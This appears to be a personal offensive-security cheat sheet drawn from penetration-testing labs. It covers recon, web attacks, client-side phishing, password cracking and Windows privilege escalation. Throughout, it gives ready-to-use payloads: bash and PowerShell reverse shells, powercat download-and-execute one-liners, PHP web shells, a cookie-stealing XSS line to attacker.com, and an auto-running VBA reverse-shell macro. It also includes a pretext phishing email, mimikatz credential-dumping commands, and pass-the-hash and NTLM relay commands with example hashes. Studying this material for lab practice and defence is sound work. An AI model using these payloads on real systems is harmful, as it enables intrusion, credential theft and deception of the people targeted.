**_Ivan_**

Interactive: `sudo rlwrap -cAr nc -lnvp [port]`
```bash
script /dev/null -c /bin/bash
CTRL + Z 
stty raw -echo; fg 
Then press Enter twice, and then enter: 
export TERM=xterm
```
# Connection
```bash
ssh -o "UserKnownHostFile=/dev/null" -o "StrictHostKeyChecking=no" learner@192.168.50.52


# Connection
```bash
ssh -o "UserKnownHostFile=/dev/null" -o "StrictHostKeyChecking=no" learner@192.168.50.52
```
`UserKnownHostsFile=/dev/null` option prevents the server host key from being recorded.
`StrictHostKeyChecking=no` option, we are telling SSH not to verify the authenticity of the server host key.
# Information Gathering
## Passive
### Whois
```bash
whois [domain name] -h [host IP]
```
### Google hacking
`site:`,`filetype:`,`ext:`,`intitle:`

Use `""` to add multiple parameters
### Subdomain
[Netcraft](https://searchdns.netcraft.com/?restriction=subdomain+matches&host=meagcorpone.com&position=limited) -> Then can go site report
### Github search
`owner:`,`path:`
### Shodan
`hostname:`,`port:`
### Security header search, TLS/SSL
[Security Header](https://securityheaders.com/) - for header search
[Qualys scan](https://www.ssllabs.com/ssltest/) - for TLS/SSL

## Active
[LOLBAS](https://lolbas-project.github.io/) - Living off the land
### DNS enumerate
type: `NS,A,AAAA,MX,PTR,CNAME,TXT`
```bash
host [domain]
```
For specific record type
```bash
host -t mx [domain]
host -t txt [domain]
....
```
**Brute force forward DNS lookup**. [DnsRecon](https://github.com/darkoperator/dnsrecon), `DNSenum`
[SecLists](https://github.com/danielmiessler/SecLists) -> **/usr/share/seclists**
```bash
sudo apt install seclists
```
Perform brute force.
```bash
dnsrecon -d [domain] -t std
dnsrecon -d [domain] -D [wordlist] -t brt
```
Under Windows environment, we can use `nslookup` for DNS enumeration.
```powershell
nslookup [-type=TXT] [domain] [host]
```
### Port scanning, Nmap
`-oG` can make the output looks better.
scan all TCP ports.
```bash
sudo nmap --min-rate 10000 -p- {ip} -oA nmap/ports
```
Scan UDP ports.
```bash
sudo nmap -sU --top-ports 100 {ip}
```
Extract open ports.
```bash
cat ports.nmap | grep open | awk -F '/' '{print $1}' | tr '\n\r' ',’
```
Scan Version,OS for open ports.
```
sudo nmap -sT -sV -O -p{open ports} {ip}
```
Port scanning in windows powershell:
```powershell
1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("192.168.50.151", $_)) "TCP port $_ is open"} 2>$null
```
### SMB enumeration
Port `139,445`
**Scan an Range**
```bash
nmap -v -p 139,445 -oG smb.txt 192.168.50.1-254
```
Use script module to scan
```bash
nmap -v -p 139,445 --script smb-os-discovery {ip}
```
List Share (Works in Windows and linux)
```bash
net view \\dc01 /all
```
Get list of host that open `smb`, and an username `alfred` -> enumerate
```bash
crackmapexec smb smb.txt -u "alfred" -p "" --shares --rid-brute
```
### SMTP Enumeration
port `25`
```bash
nc -nv [ip] 25
VRFY [username]
```
`telnet`
### SNMP Enumeration
**UDP, port`162`**
```bash
sudo nmap -sU --open -p 161 192.168.50.1-254 -oG open-snmp.txt
```
[Tool: One Sixty One](http://www.phreedom.org/software/onesixtyone/) - for snmp brute force
Build Text file containing  community strings and ip addresses.
```bash
echo public > community
echo private > community
echo manager >> community
for ip in $(seq 1 254); do echo 192.168.50.$ip; done > ips
onesixtyone -c community -i ips
```
**Use snmpwalk to query**  
```bash
snmpwalk -c public -v1 -t 10 192.168.50.151
```

| 1.3.6.1.2.1.25.1.6.0   | System Processes |
| ---------------------- | ---------------- |
| 1.3.6.1.2.1.25.4.2.1.2 | Running Programs |
| 1.3.6.1.2.1.25.4.2.1.4 | Processes Path   |
| 1.3.6.1.2.1.25.2.3.1.4 | Storage Units    |
| 1.3.6.1.2.1.25.6.3.1.2 | Software Name    |
| 1.3.6.1.4.1.77.1.2.25  | User Accounts    |
| 1.3.6.1.2.1.6.13.1.3   | TCP Local Ports  |
Those above are  Windows SNMP MIB values. When query:
```bash
snmpwalk -c public -v 1 192.168.50.151 [MIB]
```
`-Oa` : Hex -> ASCII

Extended queries (download-mibs):
```bash
snmpwalk -v X -c public <IP> NET-SNMP-EXTEND-MIB::nsExtendOutputFull
```
# Vulnerability Scanning
## Nessus
```bash
sudo systemctl start nessusd.service
```
Go https://127.0.0.1:8834
`admin:123456`

## Nmap
`-sV --script "vuln"`
Download `.nse` file (CVE, exploit)
Copy `.nse` file to `/usr/share/nmap/script/`
Then `--script ""` (nmap)

# Web application attacks
### Enumerating APIs
```bash
gobuster dir -u {url} -w /usr/share/wordlists/dirb/big.txt -p {pattern}
```
in pattern file
```bash
{GOBUSTER}/v1
{GOBUSTER}/v2
```
`robots.txt`,`sitemap.xml`
### Curl
`-d` POST, `-H` header, `-i` GET, `-X '{method type}'` 
`-L` follow redirect
eg.
`-H 'Content-Type: application/json'`
## XSS
Common special characters:
```
< > ' " { } ;
```
## For long JS payload
Minifying the JS code: [JScompress](https://jscompress.com/)
Encode it
```javascript
function encode_to_javascript(string) {
            var input = string
            var output = '';
            for(pos = 0; pos < input.length; pos++) {
                output += input.charCodeAt(pos);
                if(pos != (input.length - 1)) {
                    output += ",";
                }
            }
            return output;
        }
        
let encoded = encode_to_javascript('insert_minified_javascript')
console.log(encoded)
```
Access payload(encoded)
```javascript
<script>eval(String.fromCharCode(118,97....))</script>
```

Test:
```javascript
<img src = "https://attacker.com/?cookie="+btoa(document.cookie)>
```
## Directory Traversal
[Auto_wordlists](https://github.com/carlospolop/Auto_Wordlists)
Leveraging both `../` and `..\` when doing enumeration.
It's better to use `curl` or `Burp Suite` to reveal data.
### Linux
Check if there is parameter that is related to file, Use `../` to test.
`../../../../etc/passwd`
`../../../../home/offsec/.ssh/id_rsa`
`../../../../home/offsec/.ssh/authorized_keys`
### Windows
Use `..\` to test.
`C:\Windows\System32\drivers\etc\hosts` - it is reachable by local users.
 **Sensitive files are often not easily found on Windows without being able to list the contents of directories.**
 Gather information -> Research paths leading to sensitive files
 **eg**.  *Internet Information Services (IIS) >>  config file is at `C:\inetpub\wwwroot\web.config`*
### Encoding
[url-encode](https://cyberchef.org/#recipe=URL_Encode(false)) 
Some times special character should be URL encoded. 
`.` -> `%2e`
 in `curl`, use `--data-urlencode` parameter.
Use `--path-as-is` in curl ,there will be no encode.

## LFI
"include" a file in the application's running code -> execute
```php
<?php echo system($_GET['cmd']); ?>
```
eg. write php code(RCE) to `access.log`(user-agent) , then execute it by add `&cmd=ls%20-la`
`?page=../../../../../../../../../var/log/apache2/access.log`
## Rev shell Linux
```bash
bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
```
## PHP Wrappers
### `php://filter`  - Display contents of files  without execution.
```bash
?page=php://filter/resource=admin.php
?page=php://convert.base64-encode/resource=admin.php
```
### `data://` - Achieve code execution
_The `allow_url_include` option(disabled by default) needs to be enabled._
Add **data://** followed by the data type and content.
```bash
?page=data://text/plain,<?php%20echo%20system('ls');?>
or
?page=data://text/plain;base64,PD9waHAgZW...&cmd=ls
(In here, PD9waHAgZW...= echo -n '<?php echo system($_GET["cmd"]);?>' | base64)
```

## RFI
Include files from a remote system over HTTP or SMB. 
_The `allow_url_include` option(disabled by default) needs to be enabled to leverage RFI._
`simple-backdoor.php:`
```php
<?php
if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}
?>
```
Host a http server, `python3 -m http.server 80`
```bash
?page=http://192.168.119.3/simple-backdoor.php&cmd=ls
```

## File upload
### Change extension
`.php` -> `.phps`,`.php7`,  and `.phtml`
`.php` -> `.pHP`
### Executable File
Craft  `simple-backdoor.pHP` .Then Upload.
```sh
curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=dir
```
**Create Windows reverse shell**
```bash
pwsh
```
Then
```powershell
$Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
```
Encode
```powershell
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)

$EncodedText =[Convert]::ToBase64String($Bytes)

$EncodedText
```
Execute
```
curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20JABjAGwAaQBlAG....
```
**Kali has web shell in `/usr/share/webshells`**
### Non-Executable File
File Upload + Directory traversal
Overwrite the **authorized_keys** file in the home directory for root
```bash
ssh-keygen
fileup
```

```bash
cat fileup.pub > authorized_keys
```
Then upload it to `../../../../../../../root/.ssh/authorized_keys`. Then connect.
```bash
rm ~/.ssh/known_hosts
ssh -p 2222 -i fileup root@mountaindesserts.com
```
## Command Injection
For **Git**: `git version%3B` to bypass, `%3b` is `;` 
In cmd, we can use `&` . In powershell and bash we can use `;` and `&&`.
`Handy snippet` - Check where our code is executed.(Check environment)
```bash
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```
Use `curl` to abuse Command injection.
```bash
curl -X POST --data 'Archive=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell' http://192.168.45.201:8000/archive
```
### Use Powercat to get reverse shell (powershell target)
```bash
cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
```
Then host a netcat `nc -lvnp 443` and the powercat file `python3 -m http.server 80`
```powershell
IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.45.201/powercat.ps1");powercat -c 192.168.45.201 -p 443 -e powershell
```
Url-encode, then `curl`.
```bash
curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.45.201%2Fpowercat.ps1%22)%3Bpowercat%20-c%20192.168.45.201%20-p%20443%20-e%20powershell' http://192.168.45.201:8000/archive
```
Then receive the shell.
## SQL injection
### Common command
For mysql:
```mysql
mysql -u root -p'root' -h 192.168.50.16 -P 3306
select version()
select system_user()
show database
describe mysql.user
SELECT user, authentication_string FROM mysql.user WHERE user = 'offsec';
```
For mssql:
```mysql
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
SELECT @@version;
SELECT name FROM sys.database;
SELECT * FROM offsec.information_schema.tables;
select * from offsec.dbo.users;
```
### Identify SQLi via Error-based Payload
`//` used for terminate SQL query
```mysql
' OR 1=1 -- //
' OR 1=1 in (select @@version) -- //
```
### Union-based Payload
1. The injected **UNION** query has to include the same number of columns as the original query.
2. The data types need to be compatible between each column.
Discover the correct number of columns:
```mysql
' ORDER BY 1 -- //
' ORDER BY 2 -- //
' ORDER BY 3 -- //
...
```
Then move on enumeration by using `UNION`.
```mysql
' UNION SELECT database(), user(), @@version, null, null -- //
' UNION SELECT null, null, database(), user(), @@version  -- //
```
Next, we can enumerate the `information_schema` to get `columns table`
```mysql
' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
```
Then query table `users` and columns:`password,username,description`
```mysql
' UNION SELECT null, username, password, description, null FROM users -- //
```
### Blind SQLi
Use either `boolean-based` or `time-based` logic.
```mysql
' AND 1=1 -- //
' AND IF (1=1, sleep(3),'false') -- //
```
Observe the time. 3 seconds -> success
It's time-consuming, better to use tools.
### Manual Code Execution
Connect to mssql.
```bash
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
```
Enable `xp_cmdshell` feature:
```mysql
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell',1;
RECONFIGURE;
```
Then execute Windows shell
```mysql
EXECUTE xp_cmdshell 'whoami';
```
**Upgrade our SQL shell to a more standard reverse shell** By `SELECT ... INTO OUTFILE`
Include a single PHP line into the first column and save it as **webshell.php** in a writable web folder:
```mysql
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
```
The php code file that i upload:
```php
<? system($_REQUEST['cmd']); ?>
```
Then we can access it -> accessing `{url}/tmp/webshell.php?cmd=whoami`
### SQLMAP
`-p`:parameter,`-u`:url,`--batch`:automate `--dump` , `-T`:table, `--threads`
```bash
sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user
```
sqlmap is too noicy.  Not the first priority.
`--os-interactive`: full interactive shell.
intercept the `POST request` via Burp -> copy and save it as a local text file.
```bash
sqlmap -r post.txt -p item  --os-shell  --web-root "/var/www/html/tmp"
```
`-r`:request

`--sql-query "{query}"`

# Client-side attack
### information gathering
Displaying the metadata
```bash
exiftool -a -u [file]
```
See `Create Date`, `Modify Date`, `Author`
### Client Fingerprinting
[Canarytokens](https://canarytokens.org/nest/) - gather info about browser, IP address, and operating system from taget

### Exploiting Microsoft Office
deliver the Office document to our target -> Document with Mark of the Web(MOTW) will open in Portected View(disable editing,blocks execution of macros). -> trick victim to press the "enable editing" button 
**Macro** , _Visual Basic for Applications_ (VBA)
We could use the **.docm** or **.doc** file type for our embedded macro.
click `View` -> `Macro` -> create
 Code(automatically run powershell when open):
```Javascript
Sub AutoOpen()

  MyMacro
  
End Sub

Sub Document_Open()

  MyMacro
  
End Sub

Sub MyMacro()

  CreateObject("Wscript.Shell").Run "powershell"
  
End Sub
```
Close the document and save it, reopen it again -> press `enable content` -> powershell pops out.
Then, we can declare a string variable named _Str_ with the `Dim` ,and run Str.
Payload for powercat revershell:
```powershell
IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.156/powercat.ps1');powercat -c 192.168.45.156 -p 443 -e powershell
```
Encode it to base64 **(UTF16-LE)**
Run python script to split base64:
```python
str = "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwA..."

n = 50

for i in range(0, len(str), n):
	print("Str = Str + " + '"' + str[i:i+n] + '"')
```
Then combine it together:
```Javascript
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    
    Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU"
        Str = Str + "AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd"
    ...
        Str = Str + "gADQANAA0ADQAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsA"
        Str = Str + "A== "

    CreateObject("Wscript.Shell").Run Str
End Sub
```
Save the document, host `powercat.ps1` as http access, then start listening on port `4444`.
### File Sharing(`certutil`)
Encode first (should be the same extension)
```powershell
certutil -encode [inputFile] [encodeFile]
```
in Windows: notepad , Copy -> paste to a new txt file, change the extension.
```powershell
certutil -decode [encodeFile] [outputFile]
```
in Linux: Copy -> paste
```powershell
base64 -d encodedfile.txt > decodedfile
```
Use `certutil` for download: 
```powershell
certutil -urlcache -split -f <URL> <output_file>
```
Also can use:
```bash
cat nc64.exe| base64 -w 0 > nc64.b64
```

```powershell
[IO.File]::WriteAllBytes("C:\Users\web_svc", [Convert]::FromBase64String("[base64 code]"))
```
### File Sharing(smb)
On kali:
```bash
impacket-smbserver test . -smb2support  -username user -password pass
```
On windows:
```powershell
net use m: \\Kali_IP\test /user:user pass
copy mimikatz.log m:\
```
or Open it in Explorer.
### File Sharing(nc)
listen:
```bash
nc -l -p 1234 > received_file.zip
```
sender:
```bash
nc -w 3 [kali] 1234 < out.file
```
### File Sharing(xfreerdp)
**On Kali:**
```bash
xfreerdp /cert-ignore /compression /auto-reconnect /u:
offsec /p:lab /v:192.168.212.250 /w:1600 /h:800 /drive:test,/home/kali/
```
**On windows:**
```bash
copy mimikatz.log \\tsclient\test\mimikatz.log
```
### Fire Sharing(powershell)
```powershell
$listener = [System.Net.HttpListener]::new()  
$listener.Prefixes.Add("http://*:80/")  
$listener.Start()  
while ($listener.IsListening) {  
    $context = $listener.GetContext()  
    $response = $context.Response  
    $filePath = $context.Request.Url.LocalPath.Substring(1)  
    if (Test-Path $filePath) {  
        $fileBytes = [System.IO.File]::ReadAllBytes($filePath)  
        $response.ContentLength64 = $fileBytes.Length  
        $response.OutputStream.Write($fileBytes, 0, $fileBytes.Length)  
    } else {  
        $response.StatusCode = 404  
    }  
    $response.OutputStream.Close()  
}
```

### Abusing Windows Library File
Windows library files: **.Library-ms** file extension and can be executed by **double-clicking**
Set up a WebDAV share:
```bash
pip3 install wsgidav
```
Create the **/home/kali/webdav** directory to use as the WebDAV share that will contain our **.lnk** file
```bash
mkdir /home/kali/webdav

wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
```
Then we can create Windows library file in windows environment.
VScode -> New Text File -> save as **config.Library-ms** -> we can change the appearance of file.
Content: (Change the url)
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.45.240</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
When open, it connects to webdav share.
Once re-open it, we should paste code again in to `config.Library-ms` in VScode.
Next, create a shortcut `.lnk` file. put below command into the `type the location of the item`.
```powershell
powershell.exe -nop -w hidden -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.173:8000/powercat.ps1'); powercat -c 192.168.45.173 -p 443 -e powershell"
```
name it as `automatic_configuration`. Then `nc -lvnp 443` and host the powercat `python3 -m http.server 8000`, click the short cut to check if reverse shell works.
Send a email to trick to target to run our file.
```
Hello! My name is Dwight, and I'm a new member of the IT Team. 

This week I am completing some configurations we rolled out last week.
To make this easier, I've attached a file that will automatically
perform each step. Could you download the attachment, open the
directory, and double-click "automatic_configuration"? Once you
confirm the configuration in the window that appears, you're all done!

If you have any questions, or run into any problems, please let me
know!
```
Copy **automatic_configuration.lnk** and **config.Library-ms** to our WebDAV directory:
Click `config` directory -> drag `automatic_configuration` into directory -> copy&paste `config` directory into `config` directory.
In this eg. , we use `smb` to deliver the file to the target. (Usually by email)
```bash
cd /home/kali/webdav 
smbclient //192.168.159.195/share -c 'put config.Library-ms'
```
Then wait for the reverse shell.
### Send attachment in email (SMTP, 25)
```bash
sudo swaks -t dave.wizard@supermagicorg.com --from test@supermagicorg.com --attach @config.Library-ms --server 192.168.159.199 --body @body.txt --header "Subject: IT Setup Script" --suppress-data -ap
```
or
```bash
swaks --to jim@relia.com --from maildmz@relia.com --header 'Subject: Bad email!' --body "I've attached the problematic mail." --server 192.168.175.189 --attach @config.Library-ms --auth-user 'maildmz@relia.com' --auth-password 'DPuBT9tGCBrTbR'
```

# Public exploit
### Online
Check downloaded code before execute (important).
[Exploit database](https://www.exploit-db.com/)
[Packet Storm](https://packetstormsecurity.com/)
[Github](https://github.com/)
Google search operators: (eg. Find exploitation for Microsoft Edge site)
```bash
firefox --search "Microsoft Edge site:exploit-db.com"
```
### Offline
Searchsploit:
```bash
sudo apt update && sudo apt install exploitdb
ls -1 /usr/share/exploitdb/exploits
searchsploit [name]
searchsploit [name] -m [EDB-ID]
```
Nmap NSE Scripts:
```bash
grep Exploits /usr/share/nmap/scripts/*.nse
nmap --script-help=clamav-exec.nse
```
**keep in mind: the version of the application exploit author used can be older but it doesn't mean new versions are not vulnerable to that exploit.**

# Fixing Exploits
## Buffer Overflow
Normally **avoid** DoS exploits whenever we have better alternatives
**Bad char**: _ASCII_ or _UNICODE_ characters that **break** the application.
Focus on **_shellcode replacement_.**

In kali linux, a **cross-compiler** can be helpful:
```bash
sudo apt install mingw-w64
```
Use **mingw-w64** to compile the code into a Windows _Portable Executable_ (PE) file.
```bash
i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe
```
if there is compile error, search google.
```bash
i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32
```
Change the return address(recreate the target environment locally and use a debugger to determine this address).
Generate our own payload. (bad characters are already listed in the Python exploit)
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.4 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
```
....
## Web exploits
http/https?  path/route?  pre-auth?  authentication?  default setting?  self-signed certificates?

In requests.post:
add `verify=False` -> SSL certificate will be ignored

Observe the error that is generated when running the exploit and troubleshoot the code to determine why the error occurs. Use `print` to debug.

Convert python2 to python3 code:
```bash
sudo apt install 2to3
2to3 [file] -w
```
base64 encode data type should: `str` -> `byte`: `.encode('UTF-8')` and `.decode('UTF-8')`


# Password Attacks
## SSH and RDP
`-s` : port number
`-L` username/list
`-P` password/list
`-R` resume attack
ssh (username with password list):
```bash
hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201
```
rdp(username list with password):
```bash
hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202
```
also can apply on `ftp` and other protocol.

## HTTP POST Login form
Burpsuite -> send POST data ,identify request body -> capture difference between successful and a failed login.
```bash
hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
```
And we can use `http-get`,`http-post`.
Retrieve the request from burpsuite -> use `\r\n` to replace.
in vim:
```bash
:%s/\n/\\r\\n/g
```
Then
```bash
hydra -L userlist.txt -P passlist.txt 192.168.229.201 http-get / -m "GET / HTTP/1.1\r\nHost: 192.168.229.201\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate, br\r\nConnection: close\r\nCookie: filemanager=qba1s5ukh2tgu48oksrfoqpu0m\r\nUpgrade-Insecure-Requests: 1\r\nAuthorization: Basic ^USER^:^PASS^\r\n\r\n" -f
```

## Password cracking
### Hashcat
Create a rule for hashcat (append 1 at the end of dictionary)
```bash
echo \$1 > demo.rule
```
All letters upper case and duplicates the passwords contained in dictionary: `u d` in `.rule` 
`c` represents capitalization:
```
$1 c $!
$2 c $!
$1 $2 $3 c $!
```
variety of rules: `/usr/share/hashcat/rules`
hashcat:
```bash
hashcat [hash] [dictionary] -m [type] -a [mode] -r [rule]
```
We can identify the hash type with `hash-identifier` or `hashid`

### Searching file (Example of Keepass)
in windows(file with extension `.kdbx`):
```powershell
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```
-> kepass2john(remove the first col) -> hashcat ,search for the `-m` mode.
```bash
hashcat --help | grep -i "KeePass"
```
Then
```bash
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
```
Then , use `keepassXC` to open the `kdbx` file.
### SSH Private Key Passphrase
```hash
ssh2john id_rsa > ssh.hash
```
remove first col, then
```bash
hashcat -h | grep -i "ssh"
```
append a rule to john
```bash
sudo sh -c 'cat /home/kali/passwordattacks/ssh.rule >> /etc/john/john.conf'
```
Run john
```bash
john --wordlist=ssh.passwords --rules=sshRules ssh.hash
```
### Cracking NTLM 
 We can only extract passwords if we are running Mimikatz as Administrator (or higher) and have the `SeDebugPrivilege` access right enabled.
The token elevation function requires the `SeImpersonatePrivilege` access right to work, but all local administrators have it by default.
 **Check which users exist locally on the system**:
```powershell
Get-LocalUser
```
Then open `mimikatz.exe` by administrator, we can use (with `SeDebugPrivilege` enabled)
```
serkurlsa::logonpasswords
```
or
```powershell
privilege::debug
token::elevate
lsadump::sam
```
Then we can put NTLM hash to hashcat to bruteforce.
```powershell
mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::cache" "lsadump::sam" "sekurlsa::ekeys" "lsadump::lsa /inject" "exit"
```
### Cracking MsCacheV2
Crackmapexec with parameter `--lsa`
mimikatz:
```bash
lsadump::cache
```
To crack: Format to `$DCC2$10240#username#hash`(lowercase and no domain)-> run hashcat, mode 2100 .
## Pass-the-Hash
For SMB enumeration and management, we can use `smbclient` or `CrackMapExec` For command execution, we can use the scripts from the` impacket library` like `psexec.py` and `wmiexec.py`
```bash
smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
```
Use `impacket-psexec` (hash format is `LMHash:NTHash` ):
```bash
impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.164.212
```
Due to the nature of `psexec.py`, we'll always receive a shell as SYSTEM
Use `impacket-psexec`:
```bash
impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
```
### Cracking Net-NTLMv2
Force an authentication -> Use responder as a SMB server 
In kali:
```bash
sudo responder -I tun0
```
Then in the target, access the kali on smb server to trigger a authentication.
```bash
dir \\[kali ip]\test
```
Crack the `Net-NTLMv2` in hashcat, mode `5600`. 
if cannot crack it due to complexity -> Perform `ntlmrelayx` (impacket)
**Tricks**: for web app, upload file -> intercept -> change `filename` to UNC include(double`\`) -> responder. 
### Relaying Net-NTLM2
Condition: `UAC remote restrictions disabled` or `local administrator`
`[host1] cred` = `[host2] cred`
Tool: `impacket-ntlmrelayx`
```bash
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc JABjAGwAaQBlAG4AdA..."
```
`-smb2support` - add support for _SMB2_.
`--no-http-server`  - disable the HTTP server.
`-t` - set the target to `[host2]`
`-c` - set our command (powershell reverse shell)
Then , start a listener on **kali**, **host1**: `dir \\[kali]\test` -> receive shell from host2.

# Windows PE

LSA - Generate users/group SID for local.
DC - Generate user/group for domain.
**Well-known SIDs:**
```
S-1-0-0                       Nobody        
S-1-1-0	                      Everybody
S-1-5-11                      Authenticated Users
S-1-5-18                      Local System
S-1-5-domainidentifier-500    Administrator
```
## Situation awareness
**Key information:**
```
- Username and hostname
- Group memberships of the current user
- Existing users and groups
- Operating system, version and architecture
- Network information
- Installed applications
- Running processes
```
**List the username and hostname.**
```powershell
whoami
```
**Display all groups of our current user**
```powershell
whoami /groups
net user [user]
```
 **Obtain a list of all local users**
```powershell
Get-LocalUser
or
net user
```
**Enumerate existing groups**
```powershell
Get-LocalGroup
or
net localgroup
```
**Review the members of a group**
```powershell
Get-LocalGroupmember [Group]
```
**Check the operating system, version, and architecture:**
```powershell
systeminfo
```
**list all network interfaces**
```powershell
ipconfig /all
```
**Display the routing table**
```powershell
route print
```
**To list all active network connections.**
```powershell
netstat -ano
```
`-a`: All active TCP and UDP ports, `-n`: no name resolution, `-o`:show process ID
**Check all installed application(32-bit).**
```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```
**Check all installed application(64-bit).**
```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```
By removing `select displayname` -> see details.
Therefore, we should always check 32-bit and 64-bit **Program Files** directories located in `C:\`. Additionally, we should review the contents of the `Downloads` directory of our user to find more potential programs.
**Review the running process**
```powershell
Get-Process
```
Mapping the `ID` with `PID` in `netstat -ano`, we know ports that belongs to a process.
Also exploring detail
```powershell
Get-Process -Name "[name]" | select *
```
## Enumerate sensitive information
Check the `.kdbx` file.
```powershell
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```
Search sensitive file under `xampp`
```powershell
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
```
search for documents and text files in the home directory of the user `dave`
```powershell
Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
```
If we have **access to GUI** -> `runas /user:[username] cmd` -> prompt for password
## Information Goldmine Powershell
**We should always check the PowerShell history of a user**
```powershell
Get-History
```
`PSReadline` - **used for line-editing and command history functionality.**
```powershell
(Get-PSReadlineOption).HistorySavePath
```
Then read the `.txt` file by `type`.
```powershell
type C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```
**local group `Windows Management Users` -> `Winrm,PS-Session, SSH`**
Expand path to **find sensitive filename**:
```powershell
tree [path]
```
PS-session:
```powershell
$password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("daveadmin",$password)
Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
```
Evil-winrm:
```powershell
evil-winrm -i 192.168.50.220 -u daveadmin -p "qwertqwertqwert123\!\!"
```
**Event Viewer**:
If have RDP access -> Use `Event Viewer` -> ` Microsoft\Windows\PowerShell` section under` Applications and Services Logs`. 
### If found "PUTTY" installed
check sessions.
```powershell
reg query "HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions"
```
## Automation of enumeration
[Winpeas](https://github.com/peass-ng/PEASS-ng/releases/tag/20240811-aea595a1)
Host a http server. On the target host, download `winpeas`:
```powershell
iwr -uri http://192.168.118.2/winPEASx64.exe -Outfile winPEAS.exe
```
